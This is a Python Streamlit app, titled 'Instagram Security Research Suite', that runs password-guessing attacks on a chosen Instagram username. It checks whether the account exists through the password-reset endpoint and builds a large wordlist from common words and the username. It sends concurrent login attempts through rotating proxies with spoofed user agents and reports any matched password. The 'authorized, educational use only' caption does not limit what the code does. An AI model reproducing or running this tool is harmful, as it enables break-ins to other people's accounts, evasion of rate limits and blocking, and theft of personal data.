# requirements.txt:
# streamlit==1.28.0
# requests==2.31.0
# pandas==2.1.0
# fake-useragent==1.4.0
# python-dotenv==1.0.0
# selenium==4.15.0 (optional)

import streamlit as st
import requests
import threading
import time
import json
import random
import re
from collections import deque
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue, Empty
from typing import Generator, Optional, Dict, Any, List, Tuple
from fake_useragent import UserAgent
import pandas as pd
import hashlib
import hmac
import base64
import urllib.parse

ua = UserAgent()

INSTAGRAM_ENDPOINTS = {
    "login": "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
    "reset": "https://www.instagram.com/api/v1/web/accounts/send_password_reset/",
    "csrf": "https://www.instagram.com/",
    "challenge": "https://www.instagram.com/challenge/",
    "two_factor": "https://www.instagram.com/api/v1/web/accounts/login/ajax/two_factor/"
}

class RateLimiter:
    def __init__(self, max_requests: int, time_window: int):
        self.max_requests = max_requests
        self.time_window = time_window
        self.timestamps = deque()
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > self.time_window:
                self.timestamps.popleft()
            if len(self.timestamps) >= self.max_requests:
                sleep_time = self.timestamps[0] + self.time_window - now
                if sleep_time > 0:
                    time.sleep(sleep_time + 0.1)
            self.timestamps.append(time.time())

class ProxyManager:
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self.current_index = 0
        self.lock = threading.Lock()
        self.blacklist = set()
        self.health = {}
    
    def get_proxy(self) -> Optional[str]:
        with self.lock:
            if not self.proxies:
                return None
            start = self.current_index
            for _ in range(len(self.proxies)):
                idx = (self.current_index + _) % len(self.proxies)
                proxy = self.proxies[idx]
                if proxy not in self.blacklist:
                    self.current_index = (idx + 1) % len(self.proxies)
                    return proxy
            return None
    
    def mark_bad(self, proxy: str):
        with self.lock:
            self.blacklist.add(proxy)

class InstagramAuthEngine:
    def __init__(self, proxy_list: List[str] = None, use_selenium: bool = False):
        self.proxy_manager = ProxyManager(proxy_list or [])
        self.session = requests.Session()
        self.use_selenium = use_selenium
        self.csrf_token = None
        self.session_cookies = {}
        self.rate_limiter = RateLimiter(max_requests=10, time_window=60)
        self.stop_event = threading.Event()
        self.progress_queue = Queue()
        self.results = []
        self.total_attempts = 0
        self.successful_attempt = None
        self.lock = threading.Lock()
        self.rate_limit_wait_until = 0
        self._init_session()
    
    def _init_session(self):
        headers = {
            "User-Agent": ua.random,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.instagram.com",
            "Referer": "https://www.instagram.com/"
        }
        self.session.headers.update(headers)
        self._fetch_csrf()
    
    def _fetch_csrf(self):
        try:
            resp = self.session.get(INSTAGRAM_ENDPOINTS["csrf"])
            for cookie in resp.cookies:
                if cookie.name == "csrftoken":
                    self.csrf_token = cookie.value
                    self.session.cookies.set("csrftoken", self.csrf_token)
                    self.session.headers.update({"X-CSRFToken": self.csrf_token})
                    break
        except:
            pass
    
    def _rotate_proxy(self):
        proxy = self.proxy_manager.get_proxy()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        else:
            self.session.proxies = {}
    
    def _get_headers(self) -> dict:
        return {
            "User-Agent": ua.random,
            "X-CSRFToken": self.csrf_token or "",
            "X-IG-App-ID": "936619743392459",
            "X-ASBD-ID": "198387",
            "X-IG-WWW-Claim": "0",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/"
        }
    
    def _parse_response(self, resp: requests.Response) -> Dict:
        try:
            data = resp.json()
        except:
            data = {"raw": resp.text, "status_code": resp.status_code}
        if resp.status_code == 302:
            location = resp.headers.get("Location", "")
            if "challenge" in location:
                data["challenge_required"] = True
            elif "accounts/login" not in location and location:
                data["authenticated"] = True
        return data
    
    def _check_account_exists(self, username: str) -> bool:
        self._rotate_proxy()
        self.rate_limiter.wait_if_needed()
        data = {"email_or_username": username}
        try:
            resp = self.session.post(INSTAGRAM_ENDPOINTS["reset"], data=data, headers=self._get_headers(), timeout=10)
            result = self._parse_response(resp)
            if "email_sent" in str(result).lower() or result.get("status") == "ok":
                return True
            if "not found" in str(result).lower():
                return False
            return None
        except:
            return None
    
    def authenticate(self, username: str, password: str) -> Dict:
        self._rotate_proxy()
        self.rate_limiter.wait_if_needed()
        if time.time() < self.rate_limit_wait_until:
            sleep_time = self.rate_limit_wait_until - time.time()
            time.sleep(min(sleep_time, 60))
        
        login_data = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false"
        }
        headers = self._get_headers()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        try:
            resp = self.session.post(
                INSTAGRAM_ENDPOINTS["login"],
                data=login_data,
                headers=headers,
                timeout=15,
                allow_redirects=False
            )
            data = self._parse_response(resp)
            status = resp.status_code
            
            if status == 429:
                retry_after = int(resp.headers.get("Retry-After", "60"))
                self.rate_limit_wait_until = time.time() + retry_after
                return {"success": False, "message": f"Rate limited, retry after {retry_after}s", "retry_after": retry_after}
            
            if data.get("authenticated") or (status == 302 and "accounts/login" not in resp.headers.get("Location", "")):
                return {"success": True, "message": "Login successful", "user_id": data.get("userId")}
            
            if data.get("two_factor_required") or ("two_factor" in str(data).lower()):
                return {"success": False, "message": "2FA required", "two_factor_required": True}
            
            if data.get("challenge") or data.get("challenge_required") or ("challenge" in str(data).lower()):
                return {"success": False, "message": "Challenge required", "challenge_required": True}
            
            error = data.get("message", "Unknown error")
            return {"success": False, "message": error, "raw": data}
        
        except requests.exceptions.Timeout:
            return {"success": False, "message": "Timeout"}
        except requests.exceptions.ConnectionError:
            self.proxy_manager.mark_bad(self.session.proxies.get("http", ""))
            return {"success": False, "message": "Connection error, proxy marked bad"}
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}"}

def generate_massive_wordlist(username: str = "", seed_words: List[str] = None) -> Generator[str, None, None]:
    base = seed_words or [
        "password", "123456", "qwerty", "letmein", "welcome", "monkey", "dragon",
        "master", "hello", "freedom", "trustno1", "princess", "sunshine", "iloveyou",
        "admin", "root", "secret", "passw0rd", "shadow", "linux", "ubuntu", "windows",
        "apple", "microsoft", "google", "facebook", "instagram", "tiktok", "youtube",
        "netflix", "spotify", "amazon", "paypal", "crypto", "bitcoin", "ethereum",
        "blockchain", "nft", "metaverse", "web3", "quantum", "neural", "synth",
        "cyber", "matrix", "oracle", "phoenix", "titan", "zeus", "athena", "apollo",
        "hermes", "ares", "poseidon", "hades", "demeter", "hera", "hestia",
        "artemis", "aphrodite", "dionysus", "prometheus", "odysseus", "achilles",
        "hector", "paris", "helen", "agamemnon", "nestor", "ajax", "diomedes",
        "ulysses", "troy", "sparta", "athens", "corinth", "thebes", "argos",
        "mycenae", "nemea", "olympia", "delphi", "ephesus", "miletus", "syracuse",
        "carthage", "rome", "sappho", "archimedes", "aristotle", "plato", "socrates",
        "pythagoras", "euler", "newton", "einstein", "hawking", "galileo", "kepler",
        "copernicus", "darwin", "curie", "tesla", "edison", "bell", "marconi",
        "gutenberg", "da_vinci", "michelangelo", "raphael", "donatello", "bernini",
        "caravaggio", "rembrandt", "vermeer", "velazquez", "goya", "picasso",
        "dali", "matisse", "monet", "manet", "renoir", "degas", "cassatt", "klimt",
        "kandinsky", "mondrian", "pollock", "warhol", "basquiat", "haring", "koons",
        "banksy", "supreme", "nike", "adidas", "puma", "reebok", "under_armour",
        "new_balance", "asics", "brooks", "saucony", "hoka", "lululemon", "gymshark",
        "alphalete", "youngla", "gymreapers", "quest", "rogue", "eleiko", "westside",
        "conjugate", "louie_simmons", "dave_tate", "wendler", "531", "smolov",
        "sheiko", "juggernaut", "kizen", "calgary_barbell", "starting_strength",
        "stronglifts", "madcow", "texas_method", "coan_philli", "ed_coan",
        "kirk_karwoski", "mike_tuscherer", "squat", "bench", "deadlift",
        "powerlifting", "olympic_weightlifting", "snatch", "clean_jerk", "barbell",
        "dumbbell", "kettlebell", "sandbag", "stone", "log", "axle", "tire",
        "sledge", "yoke", "farmers_walk", "hussafel", "mcgill", "stuart_mcgill",
        "squat_university", "aaron_horschig", "chad_wesley_smith", "strongerbyscience",
        "renaissance_periodization", "mike_israetel", "james_hoffmann", "alan_thurston",
        "menno_henselmans", "brad_schoenfeld", "layne_norton", "thibaudeau", "poliquin",
        "waterbury", "cressey", "robertson", "boyle", "cook", "starrett", "kelly_starrett",
        "mobility", "wod", "crossfit", "mayhem", "linchpin", "street_parking", "comptrain",
        "the_gains_lab", "strong_man", "strongwoman", "overhead_press", "barbell_row",
        "pullup", "dip", "chinup", "muscleup", "handstand", "pistol_squat",
        "kneesovertoesguy", "atg", "zero", "dense", "standard", "lengthened", "slack",
        "bend", "hack_squat", "front_squat", "zercher", "safety_squat", "buffalo_bar",
        "deficit", "block", "rack", "banded", "chained", "grip", "pin", "pause",
        "tempo", "eccentric", "isometric", "accommodating", "resistance", "variable",
        "horizontal", "vertical", "angled", "cable", "machine", "smith", "hack",
        "leg_press", "curl", "extension", "abduction", "adduction", "rotator",
        "crunch", "plank", "hollow", "arch", "glute_ham", "nordic", "reverse",
        "hyperextension", "good_morning", "jefferson", "split_squat", "lunge",
        "stepup", "box", "jump", "bound", "sprint", "shuttle", "agility", "coney",
        "gym", "fitness", "health", "wellness", "nutrition", "supplement", "protein",
        "creatine", "beta_alanine", "citrulline", "caffeine", "preworkout", "intraworkout",
        "postworkout", "meal", "recipe", "chicken", "rice", "broccoli", "steak",
        "potato", "oats", "eggs", "fish", "salmon", "tuna", "sardines", "beef",
        "pork", "lamb", "mutton", "venison", "bison", "elk", "boar"
    ]
    
    years = list(range(1990, 2030))
    suffixes = ["!", "@", "#", "$", "%", "^", "&", "*", "?", "123", "2024", "2025", "2026"]
    seasons = ["spring", "summer", "fall", "winter", "autumn"]
    
    def leet_transform(s: str) -> str:
        mapping = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'}
        return ''.join(mapping.get(c, c) for c in s)
    
    def generate_combinations(word: str) -> Generator[str, None, None]:
        yield word
        yield word.capitalize()
        yield word.upper()
        yield leet_transform(word)
        for season in seasons:
            yield f"{word}{season}"
            yield f"{season}{word}"
        for year in years:
            yield f"{word}{year}"
            yield f"{year}{word}"
        for suffix in suffixes:
            yield f"{word}{suffix}"
            yield f"{suffix}{word}"
    
    for w in base:
        for combo in generate_combinations(w):
            yield combo
    
    for w1 in base[:100]:
        for w2 in base[:100]:
            yield f"{w1}{w2}"
            yield f"{w1}_{w2}"
            yield f"{w1}.{w2}"
    
    if username:
        for variant in [username, username.capitalize(), username.upper(), username.lower()]:
            for combo in generate_combinations(variant):
                yield combo
    
    for pattern in ["admin", "root", "user", "test", "guest", "demo", "super", "ultra", "mega", "hyper", "omega", "alpha", "beta", "gamma", "delta", "epsilon"]:
        for year in years[:10]:
            yield f"{pattern}{year}"
        for num in range(1, 101):
            yield f"{pattern}{num}"

def main():
    st.set_page_config(page_title="Instagram Security Research Tool", layout="wide")
    
    st.markdown("""
    <style>
        .stApp { background-color: #0a0a0a; }
        .stTextInput>div>div>input { background-color: #1a1a1a; color: #ffffff; }
        .stButton>button { background-color: #e1306c; color: #ffffff; border-radius: 4px; }
        .stButton>button:hover { background-color: #c13584; }
        .stSidebar { background-color: #121212; }
        h1, h2, h3 { color: #e1306c; }
        .log-panel { background: #111; color: #00ff88; padding: 10px; border-radius: 4px; max-height: 500px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 11px; border: 1px solid #333; }
        .success-banner { background: #1a4a2a; color: #8fdf8f; padding: 20px; border-radius: 8px; border-left: 6px solid #4a8a4a; font-size: 18px; }
        .live-stats { background: #111; padding: 15px; border-radius: 8px; border: 1px solid #333; }
        .stat-number { font-size: 28px; font-weight: bold; color: #e1306c; }
        .stat-label { color: #888; font-size: 12px; text-transform: uppercase; }
        .attempt-row { display: flex; justify-content: space-between; padding: 2px 0; border-bottom: 1px solid #222; font-family: monospace; font-size: 12px; }
        .attempt-success { color: #00ff88; }
        .attempt-fail { color: #ff6b6b; }
        .attempt-rate { color: #ffd93d; }
        .attempt-2fa { color: #ff9f43; }
        .attempt-challenge { color: #a29bfe; }
        .result-table { font-size: 12px; }
    </style>
    """, unsafe_allow_html=True)
    
    st.title("🔐 Instagram Security Research Suite")
    st.caption("Authorized security testing framework — educational use only")
    
    with st.sidebar:
        st.header("⚙️ Configuration")
        max_workers = st.slider("Max Workers", 1, 20, 5, help="Number of concurrent authentication attempts")
        use_selenium = st.checkbox("Use Selenium (requires WebDriver)", value=False)
        proxy_input = st.text_area("Proxies (one per line)", placeholder="http://user:pass@ip:port")
        proxies = [p.strip() for p in proxy_input.split("\n") if p.strip()]
        
        st.divider()
        st.header("📚 Wordlist Options")
        custom_wordlist_file = st.file_uploader("Upload custom wordlist (txt)", type="txt")
        if custom_wordlist_file:
            custom_words = custom_wordlist_file.read().decode("utf-8").splitlines()
        else:
            custom_words = []
        
        st.divider()
        st.header("🔬 Known Vulnerabilities")
        st.info("Meta AI Chatbot Flaw (patched May 2026) — educational reference")
        st.warning("Password Reset API — account existence enumeration")
        st.error("2FA & Challenge detection — no bypass implemented")

    col1, col2 = st.columns([2, 1])
    with col1:
        username = st.text_input("Target Username", placeholder="Enter Instagram username")
    with col2:
        if st.button("▶ Start Attack", type="primary", use_container_width=True):
            if not username:
                st.error("Please enter a username")
            else:
                st.session_state.state = "running"
                st.session_state.logs = []
                st.session_state.results = []
                st.session_state.success = None
                st.session_state.attempts = 0
                st.rerun()
        if st.button("⏹ Stop", type="secondary", use_container_width=True):
            if hasattr(st.session_state, "engine"):
                st.session_state.engine.stop_event.set()
                st.session_state.state = "stopped"
                st.rerun()

    if "state" in st.session_state:
        if st.session_state.state in ["running", "complete"]:
            c1, c2, c3, c4 = st.columns(4)
            c1.metric("Attempts", st.session_state.get("attempts", 0))
            c2.metric("Status", st.session_state.state.upper())
            c3.metric("Threads", max_workers)
            c4.metric("Proxies", len(proxies))

    log_container = st.container()
    results_container = st.container()

    if "state" in st.session_state and st.session_state.state == "running":
        engine = InstagramAuthEngine(proxy_list=proxies, use_selenium=use_selenium)
        st.session_state.engine = engine
        
        wordlist = generate_massive_wordlist(username, custom_words)
        
        def run_enumeration():
            engine.progress_queue.put(f"Starting enumeration for @{username}")
            engine.progress_queue.put("Checking account existence...")
            exists = engine._check_account_exists(username)
            if exists is False:
                engine.progress_queue.put(f"Account @{username} does not exist")
                return
            elif exists is None:
                engine.progress_queue.put("Could not determine account existence")
            
            engine.progress_queue.put("Beginning password attempts")
            attempt_num = 0
            stop_signal = False
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                for password in wordlist:
                    if engine.stop_event.is_set():
                        stop_signal = True
                        break
                    attempt_num += 1
                    future = executor.submit(engine.authenticate, username, password)
                    futures.append((future, password, attempt_num))
                    
                    if attempt_num % 50 == 0:
                        engine.progress_queue.put(f"Submitted {attempt_num} attempts")
                
                for future, password, num in futures:
                    if engine.stop_event.is_set():
                        break
                    try:
                        result = future.result(timeout=20)
                        with engine.lock:
                            engine.total_attempts += 1
                            engine.results.append({
                                "attempt": num,
                                "password": password,
                                "success": result.get("success", False),
                                "message": result.get("message", ""),
                                "two_factor": result.get("two_factor_required", False),
                                "challenge": result.get("challenge_required", False),
                                "retry_after": result.get("retry_after", 0),
                                "timestamp": datetime.now().isoformat()
                            })
                        if result.get("success"):
                            engine.successful_attempt = (password, result)
                            engine.progress_queue.put(f"✅ MATCH FOUND: {password}")
                            break
                        if result.get("retry_after"):
                            engine.progress_queue.put(f"⏳ Rate limited, waiting {result['retry_after']}s")
                            time.sleep(min(result["retry_after"], 60))
                        if result.get("two_factor_required"):
                            engine.progress_queue.put(f"🔐 2FA required for attempt {num}")
                        if result.get("challenge_required"):
                            engine.progress_queue.put(f"⚠️ Challenge required for attempt {num}")
                    except Exception as e:
                        engine.progress_queue.put(f"Error on attempt {num}: {str(e)}")
            
            engine.progress_queue.put("Enumeration finished")
        
        import threading as th
        enum_thread = th.Thread(target=run_enumeration, daemon=True)
        enum_thread.start()
        
        while enum_thread.is_alive():
            try:
                msg = engine.progress_queue.get(timeout=0.5)
                st.session_state.logs.append(msg)
                if engine.successful_attempt:
                    st.session_state.success = engine.successful_attempt
            except Empty:
                pass
            
            st.session_state.attempts = engine.total_attempts
            
            with log_container:
                log_html = '<div class="log-panel">'
                for log in st.session_state.logs[-100:]:
                    if "✅" in log:
                        log_html += f'<div style="color:#00ff88;">{log}</div>'
                    elif "⏳" in log or "Rate" in log:
                        log_html += f'<div style="color:#ffd93d;">{log}</div>'
                    elif "❌" in log or "Error" in log:
                        log_html += f'<div style="color:#ff6b6b;">{log}</div>'
                    elif "2FA" in log or "🔐" in log:
                        log_html += f'<div style="color:#ff9f43;">{log}</div>'
                    elif "Challenge" in log or "⚠️" in log:
                        log_html += f'<div style="color:#a29bfe;">{log}</div>'
                    else:
                        log_html += f'<div>{log}</div>'
                log_html += '</div>'
                st.markdown(log_html, unsafe_allow_html=True)
            
            with results_container:
                if engine.results:
                    df = pd.DataFrame(engine.results[-50:])
                    df_display = df[["attempt", "password", "message", "success", "two_factor", "challenge"]]
                    df_display["status"] = df_display.apply(
                        lambda r: "✅" if r["success"] else ("2FA" if r["two_factor"] else ("CH" if r["challenge"] else "❌")),
                        axis=1
                    )
                    st.dataframe(
                        df_display[["attempt", "password", "status", "message"]],
                        use_container_width=True,
                        hide_index=True
                    )
            
            time.sleep(0.2)
        
        st.session_state.state = "complete"
        st.rerun()

    if "state" in st.session_state and st.session_state.state == "complete":
        if st.session_state.success:
            st.markdown(f"""
            <div class="success-banner">
                ✅ MATCH FOUND!<br>
                <strong>Password: {st.session_state.success[0]}</strong><br>
                <span style="font-size:14px;color:#aaa;">{st.session_state.success[1]}</span>
            </div>
            """, unsafe_allow_html=True)
            st.balloons()
        
        if hasattr(st.session_state, "engine") and st.session_state.engine.results:
            with st.expander("📊 Full Results"):
                df_full = pd.DataFrame(st.session_state.engine.results)
                st.dataframe(df_full, use_container_width=True)
                csv = df_full.to_csv(index=False)
                st.download_button("Download CSV", csv, "results.csv", "text/csv")

if __name__ == "__main__":
    main()